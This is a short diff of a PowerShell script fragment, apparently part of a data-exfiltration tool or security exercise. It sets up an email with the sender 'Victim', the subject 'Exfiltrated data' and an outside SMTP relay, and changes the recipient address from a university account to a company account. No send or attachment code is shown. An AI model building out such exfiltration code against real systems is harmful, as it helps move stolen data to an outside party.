@@ -1,5 +1,5 @@
 ﻿$From = "Victim <victim@victim.com>"
-$To = "Jonathan Stross <jonathan.stross@stud.h-da.de>"
+$To = "Jonathan Stross <jonathan.stross@pathlock.com>"
 $Subject = "Exfiltrated data"
 $Body = "Please find attached the exfiltrated data."
 $SMTPServer = "smtp-relay.sendinblue.com"
